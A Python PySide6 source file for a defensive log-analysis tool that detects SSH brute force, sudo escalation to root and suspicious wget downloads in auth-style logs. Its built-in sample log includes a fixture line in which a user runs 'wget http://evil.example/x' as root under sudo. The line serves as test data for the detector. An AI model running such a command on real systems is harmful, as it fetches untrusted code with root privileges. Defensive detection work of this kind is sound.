"""Log Analyzer - The Depths

Real log analysis. Ingests an actual log file from disk (auth.log, Apache,
nginx, etc.) or pasted text, runs regex-based IOC detection exactly like a
lightweight log-forensics tool would - mirrors the patterns a blue-team
analyst greps for in real log files.
"""

import os
import re
import sys
from collections import Counter

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))

from PySide6.QtWidgets import (
    QFileDialog,
    QHBoxLayout,
    QLabel,
    QMainWindow,
    QPushButton,
    QTextEdit,
    QVBoxLayout,
    QWidget,
)

from apps.depths.tools._ui import BTN_STYLE, CYAN, GREEN, OUT_STYLE, RED, YELLOW, hline, make_header
from core.theme import COLORS, FONTS

SAMPLE_LOG = """\
Jun 01 08:14:22 server sshd[1234]: Accepted password for admin from 192.168.1.10 port 52000 ssh2
Jun 01 08:15:01 server sshd[1235]: Failed password for root from 45.155.205.12 port 42022 ssh2
Jun 01 08:15:03 server sshd[1236]: Failed password for root from 45.155.205.12 port 42023 ssh2
Jun 01 08:15:05 server sshd[1237]: Failed password for root from 45.155.205.12 port 42024 ssh2
Jun 01 08:15:07 server sshd[1238]: Failed password for admin from 45.155.205.12 port 42025 ssh2
Jun 01 08:15:09 server sshd[1239]: Failed password for admin from 45.155.205.12 port 42026 ssh2
Jun 01 08:15:11 server sshd[1240]: Failed password for root from 45.155.205.12 port 42027 ssh2
Jun 01 08:15:13 server sshd[1241]: Failed password for root from 45.155.205.12 port 42028 ssh2
Jun 01 08:20:33 server sudo: bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/bin/bash
Jun 01 08:21:00 server sshd[1300]: Accepted password for bob from 10.0.0.5 port 51000 ssh2
Jun 01 08:45:12 server kernel: iptables: DROP INPUT from 45.155.205.12
Jun 01 09:00:00 server cron[2000]: (root) CMD (/usr/local/bin/backup.sh)
Jun 01 09:12:55 server sshd[1500]: Accepted password for alice from 192.168.1.20 port 53000 ssh2
Jun 01 09:30:00 server sudo: alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/wget http://evil.example/x
"""


class LogAnalyzerWindow(QMainWindow):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Log Analyzer - The Depths")
        self.resize(760, 600)
        self.setStyleSheet(f"QMainWindow {{ background: {COLORS['bg_light']}; }}")

        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setContentsMargins(16, 16, 16, 16)
        layout.setSpacing(10)

        layout.addWidget(make_header(
            "\U0001F4CB Log Analyzer",
            "Read the wake - detect anomalies in real log files"
        ))
        layout.addWidget(hline())

        row = QHBoxLayout()
        self.load_btn = QPushButton("Open log file")
        self.load_btn.setStyleSheet(BTN_STYLE)
        self.load_btn.clicked.connect(self._load_file)
        row.addWidget(self.load_btn)

        self.sample_btn = QPushButton("Load sample")
        self.sample_btn.setStyleSheet(BTN_STYLE.replace(COLORS["teal"], COLORS["bg_dark"]).replace("#fff", COLORS["text"]))
        self.sample_btn.clicked.connect(self._load_sample)
        row.addWidget(self.sample_btn)

        self.analyze_btn = QPushButton("\U0001F50D Analyze")
        self.analyze_btn.setStyleSheet(BTN_STYLE.replace(COLORS["teal"], COLORS["coral"]).replace(COLORS["teal_light"], COLORS["coral_deep"]))
        self.analyze_btn.clicked.connect(self._analyze)
        row.addWidget(self.analyze_btn)
        row.addStretch()
        layout.addLayout(row)

        self.file_label = QLabel("No log file loaded")
        self.file_label.setStyleSheet(f"color: {COLORS['text_muted']}; font-size: {FONTS['size_sm']}px;")
        layout.addWidget(self.file_label)

        self.log_input = QTextEdit()
        self.log_input.setStyleSheet(OUT_STYLE.replace(COLORS["scan_green"], COLORS["text"]).replace(COLORS["bg_dark"], COLORS["bg_mid"]))
        self.log_input.setPlaceholderText("Paste log contents here, or open a real log file...")
        layout.addWidget(self.log_input, 2)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.output.setStyleSheet(OUT_STYLE)
        layout.addWidget(self.output, 1)

        self._log("[*] Log Analyzer ready")

    def _log(self, msg):
        self.output.append(msg)

    def _load_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Open log file", os.path.expanduser("~"), "Logs (*.log *.txt;*)")
        if not path:
            return
        try:
            with open(path, encoding="utf-8", errors="replace") as f:
                content = f.read()
        except OSError as e:
            self._log(f"[!] Cannot read file: {e}")
            return
        self.log_input.setPlainText(content)
        self.file_label.setText(path)
        self._log(f"[*] Loaded {os.path.basename(path)} ({len(content.splitlines())} lines)")

    def _load_sample(self):
        self.log_input.setPlainText(SAMPLE_LOG.strip())
        self.file_label.setText("sample log")
        self._log("[*] Sample log loaded")

    def _analyze(self):
        content = self.log_input.toPlainText()
        if not content.strip():
            self._log("[!] No log content to analyze")
            return
        self.output.clear()
        lines = [line for line in content.splitlines() if line.strip()]

        self._log(f"[*] Analyzed {len(lines)} log lines\n")

        failed = []
        accepted = []
        sudo = []
        wget_urls = []

        for line in lines:
            if "Failed password" in line:
                m = re.search(r"from ([\d.]+) port", line)
                ip = m.group(1) if m else "?"
                failed.append((ip, line))
            elif "Accepted password" in line:
                accepted.append(line)
            if "sudo" in line:
                sudo.append(line)
            if "wget" in line:
                m = re.search(r"http[^\s]+", line)
                if m:
                    wget_urls.append(m.group(0))

        ip_counts = Counter(ip for ip, _ in failed)

        self.output.setTextColor(YELLOW)
        self._log(f"[\u26A0] FAILED LOGINS: {len(failed)}")
        for ip, line in failed:
            self.output.setTextColor(RED if ip_counts[ip] >= 4 else YELLOW)
            self._log(f"    {line}")

        ranked = ip_counts.most_common()
        for ip, count in ranked:
            if count >= 4:
                self.output.setTextColor(RED)
                self._log(f"\n[\U0001F6A8] BRUTE FORCE DETECTED: {count} failed attempts from {ip}")

        self.output.setTextColor(GREEN)
        self._log(f"\n[\u2714] SUCCESSFUL LOGINS: {len(accepted)}")
        self.output.setTextColor(YELLOW)

        # Suspicious sudo escalation (root + remote download)
        escalation = [ln for ln in sudo if "USER=root" in ln]
        self._log(f"\n[*] SUDO ESCALATION to root: {len(escalation)}")

        if wget_urls:
            self.output.setTextColor(RED)
            self._log(f"\n[!] SUSPICIOUS DOWNLOAD from privileged user: {wget_urls[0]}")

        if not failed and not escalation and not wget_urls:
            self.output.setTextColor(GREEN)
            self._log("\n[\u2714] No clear indicators of compromise found.")

        # Also show unique source IPs as a footer (real forensics value)
        all_ips = sorted({ip for ip, _ in failed})
        if all_ips:
            self.output.setTextColor(CYAN)
            self._log(f"\n[*] Unique source IPs in failed logins: {', '.join(all_ips)}")

    def closeEvent(self, event):
        super().closeEvent(event)


def run(parent=None):
    win = LogAnalyzerWindow(parent)
    win.show()
    return win